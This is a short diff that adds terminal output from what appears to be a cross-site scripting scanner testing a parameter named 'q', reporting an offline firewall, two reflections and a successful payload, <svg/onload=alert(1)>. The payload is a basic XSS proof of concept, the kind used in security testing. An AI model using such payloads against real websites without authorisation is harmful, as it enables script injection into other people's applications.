@@ -1,0 +1,8 @@
+[91m[1m[+][0m WAF Status: [92mOffline[0m
+[97m[INFO][0m Testing parameter: q
+[97m[INFO][0m Reflections found: 2
+[97m[INFO][0m Payloads generated: 15
+[97m[RUN][0m Progress: 1/15
+[91m[1m[+][0m Payload: <svg/onload=alert(1)>
+[97m[INFO][0m Efficiency: 100
+[97m[INFO][0m Confidence: 6
